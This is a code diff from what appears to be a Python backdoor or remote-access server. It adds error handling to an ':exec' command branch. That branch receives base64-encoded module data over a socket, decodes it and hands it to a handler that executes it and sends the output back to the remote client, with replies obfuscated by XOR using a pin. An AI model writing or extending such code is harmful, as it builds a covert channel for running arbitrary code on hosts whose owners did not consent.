@@ -175,16 +175,20 @@ def main():
                 connection.send(xor("[+] File not found!", pin))
     
         elif cmd2.startswith(":exec"):
-            getname = cmd2.split(" ")        # split mod name from cmd
-            modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
+            try:
+                getname = cmd2.split(" ")        # split mod name from cmd
+                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
     
-            mod_data = ""                   # Our received file data will go here 
-            data = connection.recv(socksize)
-            mod_data += data
-            #print("[+] Module recieved!")
-            connection.send(xor("Complete", pin))     # sends OK msg to the client
-            modexec = b64decode(mod_data)   # decode the received file
-            module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
+                mod_data = ""                   # Our received file data will go here 
+                data = connection.recv(socksize)
+                mod_data += data
+                #print("[+] Module recieved!")
+                connection.send(xor("Complete", pin))     # sends OK msg to the client
+                modexec = b64decode(mod_data)   # decode the received file
+                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
+
+            except IndexError:
+                pass
 
         elif cmd2 == (":quit"):
             print("[!] Closing server!")
